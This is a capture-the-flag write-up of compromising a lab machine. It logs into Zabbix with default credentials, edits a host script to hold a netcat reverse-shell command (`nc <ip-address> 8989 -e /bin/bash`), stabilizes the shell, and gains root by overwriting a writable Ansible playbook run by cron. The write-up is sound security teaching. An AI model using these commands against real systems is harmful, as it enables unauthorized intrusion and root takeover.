# Write Up on syswatch machine

## Information Gathering And Enumeration
Let's us first start of by firing up our network mapper (nmap) to discover open ports and running services on our target. <br>
`nmap -sC -sV -oN syswatch.nmap 10.0.160.159`
```
Nmap scan report for 10.0.160.159
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Cyborg Gaming
5000/tcp open  http    nginx 1.18.0
| http-robots.txt: 2 disallowed entries 
|_/ /zabbix/".
|_http-server-header: nginx/1.18.0
|_http-title: Zabbiz: Zabbix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  3 10:20:45 2023 -- 1 IP address (1 host up) scanned in 24.85 seconds
```

From the above scan we see that there are two services running. I browsed through the service running on port `80` but found nothing interesting. Looking at port `5000` nmap tells us that the application `zabbix` is running on that port.<br>

Let's take a look at it in our browser. <br>
![zabbix homepage](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/zabbix-port-5000-browser.png)

We are greeted with a login page and as usual we test default credentials to see if they work. After some googling we come across the default credentials for `zabbix`. <br>
![zabbix default creds](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/default-logins-zabbix-google.png)


## Exploitation
We can now test these credentials to see if they work. We enter the credentials and just like that we're are logged in to `zabbix`.<br>

After spending sometime reading about zabbix RCE and browsing through the application i found a hosts tab which allows us to run some defaults scripts on hosts in `zabbix`.<br>
![checking zabbix hosts](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/checking-hosts-zabbix.png) <br>

And these are the various scripts we can run on the target. <br>
![zabbix host tab](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/zabbix-host-scripts.png)

After further probing i found out that these scripts that are run on the zabbix host can be we edited (because we are the admininstrator). Let's first start off by viewing the content of these default scripts.<br>
![zabbix original scripts](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/see-scripts.png)

After clicking on the script name we are greeted with a form which allows us to change the content of the script. For this demostration we will edit the `traceroute` script. <br>

This is the orginal content of the traceroute script.<br>
![zabbix original scripts](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/default-tracert-script.png)

We can edit this and place our malicious code here. <br>
`nc <ip-address> 8989 -e /bin/bash` <br>
After editing we can click on `update` to save those settings. <br>
![zabbix original scripts](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/edit-and-update-script.png)

We now head back to the `host` tab to run this script on the target server. We simply do that by clicking on the host and clicking on the script we want to run. Hold up!!! before you run the script make sure you have your netcat listening for incoming connections. <br>
![netcat listener](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/listening-on-nc.png)

Finally, we can run our malicous script(traceroute) to get a shell on our listener.<br>
![run mal script](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/run-modified-scripts.png)

Interesting.... we have a shell on the target. <br>
![got shell](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/connection-recieved-on-nc.png)
NB: The script run time on `zabbix` times out after some minutes. If this happens just re-run the traceroute poisoned script.


## Post Exploitation
Anytime we get a shell through netcat we obtain a dumb shell. A dump shell has very little functionality and therefore we need a stable shell. Shell Stabilization prevents you from killing your reverse shell and adds proper shell functionalities.

#### Shell Stabilization
Execute on target
1. Step 1: `python3 -c "import pty;pty.spawn('/bin/bash')"` <br>
2. Step 2: `export TERM=xterm-color` <br>
3. Step 3: `CTRL+z`<br>
On host machine.
4. Step 4: `stty raw -echo; fg` <br>
5. Step 5: `reset` <br>


## Privilege Escalation
First thing i did was to run `sudo -l` but no luck. Next i decided to check if there's a process running with elevated privileges that can be abused. <br> 
We transfer our trusted friend `pspy64` onto the target. <br>
Brief explanaation of `pspy64`: it is a program that allows us to snoop on linux processes to find sensitve information, processes running with elevated privileges amongst many others. We would have to run this on the target to get the required information. <br>

We start off by starting our python http server in the directory that houses the `pspy64` binary. <br>
![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/serving-pspy64.png)

Then we download onto our target machine. Preferably we'll first change directory to the `/tmp` since it has loose permissions (rwx) for all users. <br>
![download pspy64](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/cd-to-tmp-and-download-pspy64.png)

Next, we give `pspy64` execute permissions. <br>
![exec pspy64](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/execute-perms-on-pspy64.png)

Then we run it. <br>
![run pspy64](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/run_pspy64.png)

![cronjob ansible](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/running-cron-job.png)

From the output we find out that a cronjob is running an ansible-playbook. We can find this playbook here: `/opt/playbooks/playbook.yml`. Let's not rush into anything yet, we must first check our permissions on `/opt/playbooks/playbook.yml`. <br>
![check perms](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/write-perms-on-playbook.png)

Wow! we have write permissions. Let's run off to create a malicious playbook. <br>
![mal playbook](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/playbook-yaml-payload.png)

The we download the playbook onto out target. At this point, i assume you already have your python http server setup. <br>
![download mal playbook](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/download-mal-playbook.png)

After this, we quickly setup our netcat listener. Note that in while crafting the malicious playbook we entered a command that will spawn a shell and connect to our machine on port `9090` using netcat. <br>
Now let's listen on port 9090. `rlwrap nc -lnvp 9090`
![other nc](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/other-nc-listening.png)

We can now go back to our target and over write the original `playbook.yml`.<br>
![overwrite playbook](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/over-write-original-playbook.png)

Now, we patiently wait for a connection on `9090`. :rofl: <br>
After a while the cron runs and we receive a connection.<br>
![conn recv](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/root-shell-cron-job-execs.png)

We are now root!! :smiley:<br>
![i am root](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/syswatch/images/i-am-root.png)